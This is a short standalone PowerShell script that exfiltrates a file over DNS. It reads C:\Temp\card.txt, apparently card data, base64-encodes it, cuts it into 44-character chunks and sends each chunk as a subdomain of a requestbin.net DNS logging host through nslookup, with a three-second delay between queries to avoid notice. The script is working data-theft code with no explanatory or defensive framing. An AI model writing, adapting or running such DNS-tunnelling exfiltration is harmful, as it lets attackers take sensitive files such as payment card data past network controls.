$DNS=".02bcfa88a26b5dd64832.d.requestbin.net"
$file ="C:\Temp\card.txt"
$a=[convert]::ToBase64String((Get-Content $file -Encoding byte))
$Size=$a.Length/44
$Size1=$a.Length
for ($i=0;$i -le $Size1; $i=$i+44) {
     sleep 3
echo $Part1
     echo $i
     $Part1=$a.Substring($i,[math]::min( 44 , $Size1-$i ))
     #$a.Substring($i,44)}
     nslookup $Part1$DNS
   }
